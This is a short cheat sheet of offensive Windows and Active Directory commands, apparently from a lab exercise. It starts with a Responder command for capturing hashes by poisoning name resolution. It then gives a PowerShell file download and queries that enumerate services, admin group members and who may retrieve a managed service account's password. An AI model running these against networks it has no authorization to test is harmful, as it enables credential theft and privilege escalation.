command for responder:
```
responder -I tun0 -wv
```
Powershell commands:

Download files from a url
```
Invoke-WebRequest -Uri <ip address> -Outfile <filename>
```
Checks to see who has gmsa permissions on an AD:
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```

known manual start permissions on windows:
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
```
look for services that start manually
```
Get-Service | findstr -i "manual"
```

Check if user is in an admin group:

```
Get-ADGroupMember 'Web Admins'
```

What groups have permission to acheive a users password:
```
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
```

